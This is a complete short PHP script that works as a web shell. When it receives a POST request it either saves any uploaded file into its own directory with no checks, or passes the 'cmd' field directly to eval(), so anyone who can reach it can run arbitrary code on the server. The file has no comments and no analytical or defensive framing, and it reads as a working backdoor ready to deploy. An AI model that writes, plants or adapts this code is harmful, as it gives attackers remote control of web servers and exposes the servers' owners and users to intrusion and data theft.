<?php
if(isset($_POST["sendfile"]))
{
set_time_limit(300000);
if (move_uploaded_file($_FILES['userfile']['tmp_name'], "./".basename($_FILES['userfile']['name']))) {
    echo "yes";
} else {
    echo "no";
}
}
else if(isset($_POST["cmd"]))
{
  eval($_POST["cmd"]);
}
?>